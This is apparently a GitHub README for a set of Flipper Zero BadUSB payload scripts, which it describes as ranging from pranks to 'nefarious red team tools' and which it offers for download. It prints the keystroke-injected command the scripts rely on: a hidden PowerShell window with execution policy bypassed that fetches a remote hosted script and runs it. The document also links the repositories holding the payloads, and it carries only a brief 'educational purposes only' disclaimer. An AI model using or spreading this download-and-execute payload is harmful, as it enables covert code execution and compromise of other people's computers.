# Downloadable-Fast-Execution-Scripts-For-FlipperZero

Easy to setup with tutorials for web hooks etc below...

They use this cmd > `STRING powershell -NoP -Ep Bypass -W H -C $variable='USER_INPUT_HERE'; irm HOSTED_SCRIPT_URL_HERE | iex`

These scripts range from harmless pranks to nefarious red team tools. For educational purposes only! 

**If you want to learn more about the code, or modify them, most of these scripts are in powershell format here**

https://github.com/beigeworm/Powershell-Tools-and-Toys

# Pre-Deployment Setup
Most of these scripts will require some setup before they will work.

Setup Instructions are within the payload files.

--------------------------------------------------------------------------------
**These Scripts Are Pulled From This Repository**

https://github.com/beigeworm/assets/tree/main/Scripts

**You Should ALWAYS Read Any Scripts BEFORE running them**
